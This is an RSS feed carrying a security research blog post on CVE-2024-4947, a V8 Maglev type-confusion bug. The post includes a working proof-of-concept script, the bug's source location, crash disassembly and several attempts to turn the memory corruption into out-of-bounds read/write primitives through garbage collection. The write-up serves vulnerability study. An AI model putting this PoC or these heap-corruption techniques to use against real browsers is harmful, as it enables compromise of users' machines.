<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>@buptdsb's Blog</title><link>https://zckevin.github.io/blog</link><description>Frontend / Chromium / V8 / Devtools(TTD) / Networking(TCP/QUIC) / ?</description><copyright>@buptdsb's Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://www.svgrepo.com/show/398339/smiling-face-with-open-mouth-and-cold-sweat.svg</url><title>avatar</title><link>https://zckevin.github.io/blog</link></image><lastBuildDate>Sun, 19 May 2024 07:21:35 +0000</lastBuildDate><managingEditor>@buptdsb's Blog</managingEditor><ttl>60</ttl><webMaster>@buptdsb's Blog</webMaster><item><title>CVE-2024-4947: v8 incorrect AccessInfo for module namespace object causes Maglev type confusion</title><link>https://zckevin.github.io/blog/post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html</link><description>author: [@buptdsb](https://x.com/buptdsb), [@mistymntncop](https://x.com/mistymntncop)&#13;
2024-05-19 09:07:47&#13;
&#13;
# Info&#13;
https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html&#13;
[TBD][340221135] High CVE-2024-4947: Type Confusion in V8. Reported by Vasily Berdnikov (@vaber_b) and Boris Larin (@oct0xor) of Kaspersky on 2024-05-13&#13;
Google is aware that an exploit for CVE-2024-4947 exists in the wild.&#13;
&#13;
https://chromium-review.googlesource.com/c/v8/v8/+/5534518&#13;
&#13;
git checkout 473318dfdb09464902c7633cad03b16431145800 -b CVE-2024-4947&#13;
&#13;
# PoC&#13;
&#13;
```22.mjs&#13;
// run with: `/d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs`&#13;
import * as ns from "./22.mjs";&#13;
&#13;
export let c = 0;&#13;
&#13;
function to_fast(o) {&#13;
  var dummy = {'unique':5};&#13;
  dummy.__proto__ = o;                                                                                                                                                                                                                 &#13;
  dummy.__proto__ = o; //OptimizeAsFastPrototype&#13;
}&#13;
to_fast(ns);&#13;
&#13;
function store(target, v) {&#13;
  target.c = v;&#13;
}&#13;
&#13;
function createObject() {&#13;
  let a = {};&#13;
  a.i1 = 1;&#13;
  a.i2 = 1;&#13;
  a.i3 = 1;&#13;
  a.i4 = 1;&#13;
  // -----------------&#13;
  for (let i = 0; i &lt; 8; i++) {&#13;
    a[`p${i}`] = 1;&#13;
  }&#13;
  return a;&#13;
}&#13;
&#13;
function init() {&#13;
  let a = createObject();&#13;
  a.__proto__ = ns;&#13;
  // %DebugPrint(a);&#13;
  return a;&#13;
}&#13;
&#13;
(function() {&#13;
  %PrepareFunctionForOptimization(store);&#13;
  store(init(), 0);&#13;
  &#13;
  %OptimizeMaglevOnNextCall(store);&#13;
  store(init(), 0);&#13;
})();&#13;
&#13;
function confuse_properties_map(arg) {&#13;
  store(arg, 0x1);&#13;
}&#13;
&#13;
let a = init();&#13;
let arr = [];&#13;
arr.push(1.1);&#13;
let arr2 = [{}];&#13;
confuse_properties_map(a);&#13;
&#13;
gc();&#13;
&#13;
// %DebugPrint(a);&#13;
// %DebugPrint(arr);&#13;
&#13;
a.p5 = 1024;&#13;
a.p7 = 1024;&#13;
%DebugPrint(arr);&#13;
&#13;
// %SystemBreak();&#13;
```&#13;
![image](https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf)&#13;
&#13;
# where bug happens&#13;
## source code&#13;
```&#13;
PropertyAccessInfo AccessorAccessInfoHelper() {&#13;
  ...&#13;
  return PropertyAccessInfo::ModuleExport(zone, receiver_map,&#13;
                                            cell_ref.value());&#13;
}&#13;
&#13;
&#13;
PropertyAccessInfo PropertyAccessInfo::ModuleExport(Zone* zone,&#13;
                                                    MapRef receiver_map,&#13;
                                                    CellRef cell) {&#13;
  return PropertyAccessInfo(zone, kModuleExport, {} /* holder */,&#13;
                            cell /* constant */, {} /* api_holder */,&#13;
                            {} /* name */, {{receiver_map}, zone});&#13;
}&#13;
&#13;
&#13;
ReduceResult MaglevGraphBuilder::TryBuildStoreField(...) {&#13;
  ...&#13;
  ValueNode* store_target;&#13;
  if (field_index.is_inobject()) {    &lt;--- false&#13;
    store_target = receiver;&#13;
  } else {&#13;
    // The field is in the property array, first load it from there.&#13;
    store_target = AddNewNode&lt;LoadTaggedField&gt;({receiver}, JSReceiver::kPropertiesOrHashOffset);&#13;
  }&#13;
...&#13;
  if (field_representation.IsSmi()) {     &lt;------ field_representation is `none` for a `kModuleExport` AccessInfo&#13;
    ...&#13;
  } else if (value-&gt;use_double_register()) {&#13;
    ...&#13;
  } else {&#13;
    BuildStoreTaggedField(store_target, value, field_index.offset()); &lt;---------- field index offset is 0&#13;
  }&#13;
&#13;
}&#13;
```&#13;
## crash site&#13;
```&#13;
0x7fe1e00001d6   196  8b7803               movl rdi,[rax+0x3]                                                                                                                                                                 &#13;
0x7fe1e00001d9   199  4903fe               REX.W addq rdi,r14                                                                                                                                                                          &#13;
...&#13;
0x7fe1e0000225   1e5  8947ff               movl [rdi-0x1],rax           &lt;--- crash                                                                  &#13;
```&#13;
&#13;
$rax is the receiver, [rax+0x3] is receiver’s properties&#13;
&#13;
$r14 seems like to be the ptr compression cage base pointer?&#13;
![image](https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22)&#13;
&#13;
`properties` is a FixedArray, as the write offset is 0, we are writing to `FixedArray`’s map, which lives in ReadOnlySpace:&#13;
![image](https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6)&#13;
![image](https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab)&#13;
&#13;
Now we have a primitive: `mov [[object_addr + 4] + 0], rax`,&#13;
which means we could write any integer into a jsobject’s propertyarray’s map field&#13;
&#13;
# Research timeline&#13;
## Failed attempt 1: an oob write using hash value write&#13;
As we have a type confusion primitive, then i open the map.h layout, &#13;
seems like the only field which could be used in a PropertyArray map is `instance_type`.&#13;
Other fields are for JSObjects.&#13;
&#13;
For maglev optimization to work, we MUST have a fast jsobject, &#13;
For a fast jsobject, it could be confused with a dict mode jsobject, which instance_type is dict.&#13;
![image](https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780)&#13;
&#13;
&#13;
So we start grep code with `IsPropertyArray()`:&#13;
&#13;
Try confuse a fast PropertyArray -&gt; Dictionary, then set hash on this fast object,&#13;
as the hash store position is different in these two types, we MAY write oob into another array’s length field.&#13;
Although the hash value is a random smi, in most times it’s value is greater than 0, so it’s ok to be an array’s length.&#13;
![image](https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1)&#13;
&#13;
&#13;
Now we have another primitive:&#13;
oob write any **smi value** into field index 4(the 5th element) of a propertyarray&#13;
&#13;
### failed code snippet 1&#13;
demo code using sandbox api:&#13;
```&#13;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));&#13;
&#13;
let dict = {};&#13;
dict.a = 1;&#13;
delete dict.a;&#13;
&#13;
let dict_properties = memory.getUint32(Sandbox.getAddressOf(dict) + 4, true);&#13;
let dict_properties_map_addr = memory.getUint32(dict_properties - 1, true);&#13;
&#13;
let foo = {};&#13;
foo.p1 = 1;&#13;
foo.p2 = 1;&#13;
foo.p3 = 1;&#13;
foo.p4 = 1;&#13;
foo.p5 = 1;&#13;
%DebugPrint(foo);&#13;
&#13;
let properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);&#13;
memory.setUint32(properties - 1, dict_properties_map_addr, true);&#13;
&#13;
const ws = new WeakSet();&#13;
ws.add(foo);&#13;
&#13;
%SystemBreak();&#13;
```&#13;
&#13;
The fixedarray set aborts in `CodeStubAssembler::FixedArrayBoundsCheck()`, it’s a CSA_CHECK, not DCHECK.&#13;
Cause we will load hash value and compare the value with kNoHashSentinel(int value 0) first,&#13;
the fixedarray load in CSA has bound check enabled by default. &#13;
![image](https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392)&#13;
&#13;
&#13;
### create hash take 2&#13;
Find that we could use map normalization to trigger hash creation:&#13;
```&#13;
function set_hash(arg) {&#13;
    let sb = {a2222222221: 1, a2222222222 : 1};&#13;
    sb.__proto__ = arg;&#13;
    delete sb.a2222222222;&#13;
}&#13;
set_hash(obj);&#13;
```&#13;
![image](https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78)&#13;
&#13;
&#13;
### try to create 1-length PropertyArray&#13;
This hash value oob write is quite weak:&#13;
write smi only, we can’t change any map address to trigger confusion&#13;
cause we are doing a CAS alike operation, the hash creation function’s check part needs the field value to be 0 at first&#13;
since most propertyarrays has unused elements allocated, we could only write to the second field of the adjacent v8 object&#13;
prototype_maps can have 1-length PropertyArray, but can't have transition-tree, so can't be optizmized by ML/TF&#13;
![image](https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1)&#13;
&#13;
&#13;
Most FixedArrays have a `empty_fixed_array()` alike objects in heap roots&#13;
&#13;
- Other objects like fixedarray:&#13;
- Regex match info&#13;
- feedback vector&#13;
- ...&#13;
&#13;
Seems too internal to be controlled from user js&#13;
&#13;
## Failed attempt 2: using gc&#13;
Two objects are located adjacently after gc, &#13;
if one propertyarray’s length is shrinked, the jsarray’s length is intact,&#13;
then we may trigger a oob read?&#13;
&#13;
Demo:&#13;
```&#13;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));&#13;
&#13;
let foo = {};&#13;
let bar = {};&#13;
foo.p1 = 1;&#13;
foo.p2 = 1;&#13;
foo.p3 = 1;&#13;
foo.p4 = 1;&#13;
// ---------&#13;
foo.p5 = 1;&#13;
foo.p6 = 1;&#13;
foo.p7 = 1;&#13;
foo.p8 = 1;&#13;
&#13;
bar.p1 = 1;&#13;
bar.p2 = 1;&#13;
bar.p3 = 1;&#13;
bar.p4 = 1;&#13;
bar.p5 = 1;&#13;
&#13;
%DebugPrint(foo);&#13;
%DebugPrint(bar);&#13;
&#13;
properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);&#13;
memory.setUint32(properties - 1 + 4, 0x6, true);&#13;
&#13;
// %DebugPrint(foo.p8);&#13;
&#13;
gc();&#13;
&#13;
%DebugPrint(foo);&#13;
%DebugPrint(bar);&#13;
&#13;
properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);&#13;
memory.setUint32(properties - 1 + 4, 0x12, true);&#13;
&#13;
%DebugPrint(foo.p8);&#13;
&#13;
%SystemBreak();&#13;
```&#13;
&#13;
As we can only override the propertyarray’s map, not the propertyarray itself&#13;
and the map of it has variable length(which is 0)&#13;
&#13;
## gc take 2&#13;
We could confuse a propertyarray’s map -&gt; heapnumber’s map,&#13;
then trigger a gc, then the propertyarray’s body would shrink and we have a oob read/write.&#13;
&#13;
Since most (internal) maps are copied from the snapshot blob into heap, and there addresses are fixed.&#13;
(the addrs may differ in different chrome versions?)&#13;
&#13;
![image](https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd)&#13;
&#13;
&#13;
we could create a layout graph:&#13;
```&#13;
-------------&#13;
jsobject’s properties map&#13;
length&#13;
&lt;body&gt;&#13;
-------------&#13;
jsarray map&#13;
properties ptr&#13;
elements ptr&#13;
length            &lt;- p5&#13;
-------------&#13;
jsarray’s elements map&#13;
length            &lt;- p7&#13;
&lt;body&gt;&#13;
-------------&#13;
```&#13;
&#13;
before gc:&#13;
![image](https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09)&#13;
&#13;
&#13;
after gc:&#13;
![image](https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45)&#13;
&#13;
## gc after PropertyArray type confused with a string&#13;
After calling `confuse_properties_map(a)`, we have set properties map ptr into 0x2f0000000002 (smi value)&#13;
&#13;
Then in gc(), it would take the memory range from 0x2f0000000002-1 as a Map.&#13;
Other fields are irrelevant except the `instance_type`, since that decides which apply function to call.&#13;
If it’s not a valid type, the large switch loop would fall into default case and abort.&#13;
&#13;
As the `instance_type` is 0 for now, it’s `INTERNALIZED_TWO_BYTE_STRING_TYPE`, &#13;
so we will call `CALL_APPLY(SeqTwoByteString)` to gc this object.&#13;
&#13;
For SeqTwoByteString, the `IterateBody` is a no-op. GC just move the whole string range from one place&#13;
to another.&#13;
&#13;
The layout of a js string is: `map | raw_hash_field | int32 length | ...`&#13;
So the length of this string is 0x02, the whole length of the heapobject is 16(3 * 4 + 2 * 2),&#13;
then after gc, propertyarray would have 2 elements inside, other elements are dropped.&#13;
&#13;
pic: &lt;the map from 0x2f0000000002-1&gt;&#13;
![image](https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7)&#13;
&#13;
pic:&#13;
&lt;SeqTwoByteString, map / raw_hash_field / length / string body&gt;&#13;
&lt;PropertyArray, map / length / element 0 / element 1&gt;&#13;
![image](https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17)&#13;
&#13;
&#13;
```&#13;
template &lt;typename ObjectVisitor&gt;&#13;
void HeapObject::IterateBodyFast(PtrComprCageBase cage_base, ObjectVisitor* v) {&#13;
  Tagged&lt;Map&gt; m = map(cage_base);&#13;
  IterateBodyFast(m, SizeFromMap(m), v);&#13;
}&#13;
&#13;
template &lt;typename ObjectVisitor&gt;&#13;
void HeapObject::IterateBodyFast(Tagged&lt;Map&gt; map, int object_size,&#13;
                                 ObjectVisitor* v) {&#13;
  BodyDescriptorApply&lt;CallIterateBody&gt;(map-&gt;instance_type(), map, *this,&#13;
                                       object_size, v);&#13;
}&#13;
&#13;
template &lt;typename Op, typename... Args&gt;&#13;
auto BodyDescriptorApply(InstanceType type, Args&amp;&amp;... args) {&#13;
  switch (type) {&#13;
      case kSeqStringTag:&#13;
          return CALL_APPLY(SeqOneByteString);&#13;
    ...&#13;
    default:&#13;
UNREACHABLE();	&#13;
  }&#13;
}&#13;
&#13;
class SeqOneByteString::BodyDescriptor final : public DataOnlyBodyDescriptor {&#13;
  ...&#13;
}&#13;
&#13;
class DataOnlyBodyDescriptor : public BodyDescriptorBase {&#13;
 public:&#13;
  template &lt;typename ObjectVisitor&gt;&#13;
  static inline void IterateBody(Tagged&lt;Map&gt; map, Tagged&lt;HeapObject&gt; obj,&#13;
                                 int object_size, ObjectVisitor* v) {}      &lt;-------- noop here&#13;
};&#13;
&#13;
template &lt;class Visitor&gt;&#13;
void LiveObjectVisitor::VisitMarkedObjectsNoFail(PageMetadata* page,&#13;
                                                 Visitor* visitor) {&#13;
  for (auto [object, size] : LiveObjectRange(page)) {&#13;
    const bool success = visitor-&gt;Visit(object, size);&#13;
   }&#13;
}&#13;
&#13;
bool LiveObjectRange::iterator::AdvanceToNextMarkedObject() {&#13;
  ...&#13;
        current_size_ = ALIGN_TO_ALLOCATION_ALIGNMENT(&#13;
          current_object_-&gt;SizeFromMap(current_map_));&#13;
}&#13;
&#13;
int HeapObject::SizeFromMap(Tagged&lt;Map&gt; map) const {&#13;
  ...&#13;
  if (instance_type == SEQ_TWO_BYTE_STRING_TYPE ||&#13;
      instance_type == INTERNALIZED_TWO_BYTE_STRING_TYPE ||&#13;
      instance_type == SHARED_SEQ_TWO_BYTE_STRING_TYPE) {&#13;
    // Strings may get concurrently truncated, hence we have to access its&#13;
    // length synchronized.&#13;
    return SeqTwoByteString::SizeFor(&#13;
        SeqTwoByteString::unchecked_cast(*this)-&gt;length(kAcquireLoad));&#13;
  }&#13;
}&#13;
&#13;
V8_INLINE constexpr int32_t SeqTwoByteString::SizeFor(int32_t length) {&#13;
  return OBJECT_POINTER_ALIGN(SeqTwoByteString::DataSizeFor(length));&#13;
}&#13;
```&#13;
&#13;
Stack trace for gc:&#13;
```&#13;
#0  v8::internal::CallIterateBody::apply&lt;v8::internal::SeqOneByteString::BodyDescriptor, false, v8::internal::RecordMigratedSlotVisitor&gt; (map=..., obj=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1506&#13;
#1  0x00007f6ecd5be46e in v8::internal::BodyDescriptorApply&lt;v8::internal::CallIterateBody, v8::internal::Tagged&lt;v8::internal::Map&gt;&amp;, v8::internal::HeapObject&amp;, int&amp;, v8::internal::RecordMigratedSlotVisitor*&amp;&gt; (type=v8::internal::SEQ_ONE_BYTE_STRING_TYPE, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1165&#13;
#2  0x00007f6ecd5be3b5 in v8::internal::HeapObject::IterateBodyFast&lt;v8::internal::RecordMigratedSlotVisitor&gt; (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1512&#13;
#3  0x00007f6ecd5cf6e4 in v8::internal::HeapObject::IterateFast&lt;v8::internal::RecordMigratedSlotVisitor&gt; (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1479&#13;
#4  0x00007f6ecd5cef02 in v8::internal::EvacuateVisitorBase::RawMigrateObject&lt;(v8::internal::EvacuateVisitorBase::MigrationMode)0&gt; (base=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1503&#13;
#5  0x00007f6ecd5d0374 in v8::internal::EvacuateVisitorBase::MigrateObject (this=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1626&#13;
#6  0x00007f6ecd5d0138 in v8::internal::EvacuateVisitorBase::TryEvacuateObject (this=0x5635fee63598, target_space=v8::internal::OLD_SPACE, object=..., size=20, target_object=0x7fff5e1922e0) at ../../src/heap/mark-compact.cc:1602&#13;
#7  0x00007f6ecd5cea9f in v8::internal::EvacuateNewSpaceVisitor::Visit (this=0x5635fee63598, object=..., size=20) at ../../src/heap/mark-compact.cc:1669&#13;
#8  0x00007f6ecd5b2761 in v8::internal::LiveObjectVisitor::VisitMarkedObjectsNoFail&lt;v8::internal::EvacuateNewSpaceVisitor&gt; (page=0x5635fee4fd40, visitor=0x5635fee63598) at ../../src/heap/mark-compact.cc:4235&#13;
#9  0x00007f6ecd5901e4 in v8::internal::Evacuator::RawEvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4253&#13;
#10 0x00007f6ecd58fe80 in v8::internal::Evacuator::EvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4162&#13;
```。</description><guid isPermaLink="true">https://zckevin.github.io/blog/post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html</guid><pubDate>Sun, 19 May 2024 07:07:14 +0000</pubDate></item></channel></rss>